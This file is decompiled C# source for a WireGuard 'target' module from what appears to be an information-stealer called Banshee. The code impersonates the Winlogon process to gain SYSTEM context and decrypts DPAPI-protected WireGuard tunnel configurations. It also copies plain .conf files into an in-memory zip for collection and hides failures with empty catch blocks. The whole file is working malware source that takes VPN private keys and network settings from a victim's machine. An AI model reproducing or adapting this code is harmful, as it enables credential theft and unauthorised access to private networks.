﻿using System;
using System.IO;
using System.Threading.Tasks;
using Banshee.Helper;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000039 RID: 57
	public class WireGuard : ITarget
	{
		// Token: 0x06000077 RID: 119 RVA: 0x000049A4 File Offset: 0x000049A4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Program Files\\WireGuard\\Data\\Configurations";
			if (!Directory.Exists(text))
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "WireGuard";
			string targetBase = ZipPath.Vpn("WireGuard");
			try
			{
				using (ImpersonationHelper.ImpersonateWinlogon())
				{
					Parallel.ForEach<string>(Directory.GetFiles(text), delegate(string file)
					{
						try
						{
							string extension = Path.GetExtension(file);
							if (extension == ".dpapi")
							{
								byte[] content = DpApi.Decrypt(File.ReadAllBytes(file));
								zip.AddFile(Path.Combine(targetBase, Path.GetFileNameWithoutExtension(file)), content);
							}
							else if (extension == ".conf")
							{
								zip.AddFile(Path.Combine(targetBase, Path.GetFileNameWithoutExtension(file) + ".conf"), File.ReadAllBytes(file));
							}
						}
						catch
						{
						}
					});
				}
			}
			catch
			{
			}
			counterApplications.Files.Add(text + " => " + targetBase);
			counterApplications.Files.Add(targetBase + "\\");
			counter.Vpns.Add(counterApplications);
		}
	}
}
